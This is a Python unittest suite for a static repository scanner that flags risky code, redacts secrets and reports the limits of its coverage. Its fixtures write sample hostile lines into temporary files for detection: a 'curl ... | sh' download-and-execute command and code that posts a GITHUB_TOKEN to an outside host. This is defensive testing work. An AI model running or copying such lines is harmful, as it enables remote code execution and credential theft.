"""Static review remains bounded, non-executing, redacted and explicit about limits."""
from pathlib import Path
import sys
import tempfile
import threading
import unittest
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import scout_scan as scan


class SourceScanTest(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)

    def tearDown(self):
        self.temporary.cleanup()

    def write(self, path, content):
        target = self.root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
        return target

    def test_real_capabilities_have_line_evidence_and_review_caveats(self):
        self.write("src/main.py", "import os\ntoken = os.environ['GITHUB_TOKEN']\nrequests.post('https://example.invalid', data=token)\n")
        self.write("README.md", "curl https://example.invalid/install | sh\n")
        self.write(".github/workflows/build.yml", "permissions: write-all\n")
        result = scan.scan_repository(self.root)
        rules = {item["rule_id"]: item for item in result["findings"]}
        self.assertEqual(result["level"], "high")
        self.assertEqual(rules["environment_access"]["line"], 2)
        self.assertEqual(rules["network_io"]["line"], 3)
        self.assertIn("sensitive_network_proximity", rules)
        self.assertIn("ci_permissions", rules)
        self.assertIn("文档", rules["download_execute"]["reason"])
        self.assertTrue(any("不代表安全" in line for line in result["limitations"]))
        self.assertTrue(any("尚未证明" in item["reason"] for item in result["findings"]))

    def test_likely_secrets_and_truncated_private_keys_are_not_reproduced(self):
        values = ["ghp_abcdefghijklmnop", "sk-abcdefghijklmnopqrstuvw", "plain-secret"]
        self.write("main.py", "requests.post('https://example.invalid', token='" + values[0] + "')\n"
                   + "requests.post('https://example.invalid', api_key='" + values[1] + "')\n"
                   + "requests.post('https://example.invalid', password='" + values[2] + "')\n")
        report = str(scan.scan_repository(self.root))
        for value in values:
            self.assertNotIn(value, report)
        self.assertNotIn("privatecontents", scan.redact_text("-----BEGIN PRIVATE KEY-----\nprivatecontents"))
        self.assertNotIn("a-secret", scan.redact_text("https://user:a-secret@example.invalid"))

    def test_empty_and_clean_results_do_not_claim_safety(self):
        self.assertEqual(scan.scan_repository(self.root)["level"], "unknown")
        self.write("main.py", "print('hello')\n")
        result = scan.scan_repository(self.root)
        self.assertEqual(result["level"], "info")
        self.assertEqual(result["label"], "仅完成静态初筛")
        self.assertEqual(result["findings"], [])

    def test_high_priority_findings_survive_low_priority_noise(self):
        self.write("a.py", "os.getenv('HOME')\n" * 10)
        self.write("z.sh", "curl https://example.invalid/a | sh\n")
        with mock.patch.object(scan, "MAX_FINDINGS", 2):
            result = scan.scan_repository(self.root)
        self.assertEqual(len(result["findings"]), 2)
        self.assertEqual(result["findings"][0]["severity"], "high")
        self.assertTrue(result["coverage"]["findings_truncated"])
        self.assertGreater(result["coverage"]["findings_suppressed"], 0)
        self.assertEqual(result["coverage"]["files_scanned"], 2)

    def test_limits_and_unsupported_sources_have_coverage(self):
        self.write("large.txt", "x" * 100)
        self.write("node_modules/hidden.js", "eval('bad')")
        self.write("binary.dat", "\x00abcd")
        self.write("binary.png", "image")
        with mock.patch.object(scan, "MAX_FILE_BYTES", 80):
            result = scan.scan_repository(self.root)
        reasons = result["coverage"]["skipped_by_reason"]
        self.assertEqual(reasons["file_size_limit"], 1)
        self.assertEqual(reasons["binary_content"], 1)
        self.assertEqual(reasons["binary_extension"], 1)
        self.assertEqual(result["coverage"]["directories_skipped_by_reason"]["excluded_directory"], 1)
        self.assertEqual(result["level"], "unknown")
        self.assertTrue(any("覆盖不完整" in item for item in result["limitations"]))

    def test_overlong_lines_are_skipped_without_hiding_later_evidence(self):
        self.write("main.py", "x" * 9000 + "\ncurl https://example.invalid/x | sh\n")
        result = scan.scan_repository(self.root)
        self.assertEqual(result["coverage"]["skipped_by_reason"]["line_size_limit"], 1)
        self.assertEqual(result["level"], "high")
        self.assertEqual(result["findings"][0]["line"], 2)

    def test_cancellation_and_symlinks(self):
        event = threading.Event(); event.set()
        with self.assertRaises(scan.ScanCancelled):
            scan.scan_repository(self.root, cancel_event=event)
        outside = self.root.parent / (self.root.name + "-outside")
        outside.write_text("curl https://example.invalid/x | sh")
        try:
            try:
                (self.root / "link").symlink_to(outside)
            except OSError as exc:
                if getattr(exc, "winerror", None) == 1314:
                    self.skipTest("Windows account lacks symbolic-link privilege")
                raise
            result = scan.scan_repository(self.root)
            self.assertEqual(result["coverage"]["files_scanned"], 0)
            self.assertEqual(result["findings"], [])
        finally:
            outside.unlink()


if __name__ == "__main__":
    unittest.main()
